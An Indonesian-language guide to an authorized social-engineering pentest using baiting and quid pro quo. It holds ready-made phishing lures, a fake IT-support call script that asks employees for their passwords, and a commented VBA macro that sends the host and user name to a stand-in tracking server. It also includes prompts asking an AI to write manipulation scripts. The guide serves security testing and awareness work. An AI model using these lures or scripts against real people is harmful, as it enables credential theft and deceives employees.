# Personnel Pentest: Baiting & Quid Pro Quo

**Tujuan:** Test apakah karyawan bisa dimanipulasi dengan iming-iming hadiah atau pertukaran layanan  
**Durasi:** 2–5 hari

---

## Baiting vs Quid Pro Quo

| Aspek | Baiting | Quid Pro Quo |
|-------|---------|-------------|
| Mekanisme | Iming-iming hadiah/konten menarik | Pertukaran layanan ("saya bantu kamu, kamu bantu saya") |
| Media | Fisik (USB, CD) atau digital (download link) | Telepon atau tatap muka |
| Contoh | "Download film gratis" → malware | "Saya bantu reset PC kamu, tolong kasih password dulu" |
| Psikologi | Keserakahan/rasa ingin tahu | Reciprocity (merasa berhutang budi) |

---

## Skenario Baiting

### Digital Baiting

```
Skenario 1: Free Software / Pirated Content
Email:
"Rekan, saya punya link download Microsoft Office 365 gratis (no license needed).
Sudah saya pakai sendiri, works fine!
[Download di sini: http://attacker/office365-crack.exe]"

→ Test: apakah karyawan download dan jalankan file dari rekan?
→ File sebenarnya: benign file dengan tracking beacon (bukan malware nyata)

Skenario 2: "Confidential" Document
Email dari alamat mirip internal:
"Tolong review dokumen ini sebelum meeting besok.
Jangan dibagi ke orang lain dulu.
[Rencana_Restrukturisasi_2025.docx]"

→ Dokumen berisi macro tracker (bukan payload berbahaya)
→ Test: apakah karyawan buka file dari pengirim tidak dikenal?

Skenario 3: QR Code di Area Kantor
Tempel stiker QR code di area kantor:
"Scan untuk WiFi Guest Password baru"
"Free lunch voucher untuk karyawan - scan here!"

→ QR mengarah ke tracking URL (bukan situs berbahaya)
→ Test: berapa karyawan scan QR code sembarangan?
```

---

## Skenario Quid Pro Quo

```
Skenario 1: Fake IT Support (paling umum)

Penyerang menelepon secara random ke extension internal:

"Halo, ini IT Support. Kami sedang melakukan upgrade
keamanan di semua workstation hari ini. Saya sudah
mengerjakan komputer di departemen lain, sekarang giliran
departemen Anda.

Apakah komputer Anda terasa lambat atau ada masalah?
Saya bisa bantu optimalkan sekarang jika Anda mau."

[Jika target bilang iya ada masalah:]
"Baik, untuk remote access, saya perlu login sebentar.
Bisa berikan username dan password Anda untuk saya
verifikasi aksesnya?"

---

Skenario 2: Survey dengan Hadiah

Email:
"Selamat! Anda terpilih mengikuti survei kepuasan karyawan.
Isi survei 5 menit → dapatkan voucher Gojek Rp100.000!

[Mulai Survei: link]"

Survei berisi pertanyaan:
- Nama lengkap
- Departemen  
- Nama atasan langsung
- Sistem apa yang Anda gunakan sehari-hari?
- Kepuasan dengan email system saat ini?

→ Kumpulkan informasi OSINT tanpa disadari
```

**Prompt Claude Code:**
```
Quid pro quo test untuk targetcorp.co.id (authorized).
Saya akan telepon ke 30 extension acak (dari list karyawan yang diberikan klien).

Buatkan:
1. Script lengkap untuk "IT support upgrade" quid pro quo
2. Cara handle berbagai respon (susah diajak bicara, curiga, langsung percaya)
3. Pertanyaan yang terdengar teknis tapi sebenarnya mengumpulkan info
4. Cara natural mengakhiri percakapan jika target mulai curiga
5. Variasi script untuk target yang berbeda (staf junior vs senior)
```

---

## Phase 3: Digital Baiting Test

```bash
# Setup tracking untuk digital baiting

# 1. Email dengan tracking pixel (cek siapa yang buka)
# Embed: <img src="http://tracking.server/pixel.gif?id=USER_ID&campaign=baiting">

# 2. File dengan beacon
# Word macro yang kirim hostname saat dibuka:
# (ini versi aman untuk training — tidak persist, tidak execute pada restart)

# Sub CreateBeacon()
#   Dim http As Object
#   Set http = CreateObject("MSXML2.XMLHTTP")
#   http.Open "GET", "http://tracking.server/beacon?host=" & Environ("COMPUTERNAME") & "&user=" & Environ("USERNAME"), False
#   http.Send
# End Sub

# 3. QR code generator
# pip install qrcode
import qrcode
qr = qrcode.make("http://tracking.server/qr?location=lift_lt3")
qr.save("qr_wifi_lift.png")
```

---

## Phase 4: Analisis Hasil

**Prompt Claude Code:**
```
Hasil baiting & quid pro quo test:

Digital Baiting:
- Email "software gratis": 18/50 download (36%)
- Email "dokumen rahasia": 29/50 buka (58%)
- QR code di kantin: 23 scan dalam 2 hari

Quid Pro Quo (30 panggilan):
- Berhasil dapat username: 12/30 (40%)
- Berhasil dapat password: 5/30 (17%)
- Target langsung curiga: 8/30 (27%)
- Target bertanya balik: 7/30 (23%)
- Target telepon IT asli untuk verifikasi: 3/30 (10%)

Yang menarik:
- Dokumen dengan judul "rahasia" dibuka lebih banyak daripada "software gratis"
- Staf baru (< 1 tahun) 2x lebih rentan
- Jam rawan: Selasa-Kamis, 10:00-11:30

Buatkan analisis mendalam dan program awareness berbasis temuan ini.
```

---

## Phase 5: Program Training Berdasarkan Temuan

```
Framework Security Awareness yang Efektif:

JANGKA PENDEK (1-4 minggu):
- Workshop: "Social Engineering — Bagaimana Penyerang Memanipulasi Kita"
- Video 5 menit: kasus nyata social engineering (Indonesia)
- Quick guide: cara mengenali dan melaporkan serangan

JANGKA MENENGAH (1-3 bulan):
- Simulasi phishing bulanan
- Newsletter keamanan mingguan
- Poster di area kantor (lift, kantin, toilet)

JANGKA PANJANG (ongoing):
- Security champion program (1 orang per departemen)
- Quarterly awareness test
- Reward untuk yang melaporkan insiden/serangan
- Metric: track improvement dari test ke test

KPI:
- Phishing click rate: turun dari X% ke < 5%
- USB plug rate: turun dari X% ke < 10%
- Reporting rate: naik ke > 30%
```

---

## Checklist Baiting & Quid Pro Quo Pentest

```
[ ] Setup tracking infrastructure (server + beacon files)
[ ] Siapkan bait digital: email, file, QR code
[ ] Siapkan script quid pro quo untuk telepon
[ ] Eksekusi: digital baiting via email + QR
[ ] Eksekusi: quid pro quo via telepon (30+ panggilan)
[ ] Monitor tracking server real-time
[ ] Catat: siapa, kapan, bagaimana response
[ ] Reveal dan debrief (frame sebagai learning, bukan punishment)
[ ] Laporan: patterns + vulnerability profile per departemen
[ ] Buat program awareness berdasarkan temuan
```

---

## Durasi Estimasi

| Fase | Durasi |
|------|-----------|----------|
| Persiapan (script + tracking + baits) | 1 hari | 2–3 hari |
| Eksekusi (3–5 hari) | 3–5 hari | 3–5 hari (sama) |
| Analisis + program training | 1 hari | 2–3 hari |
| **Total** | **5–7 hari** | **7–11 hari** |
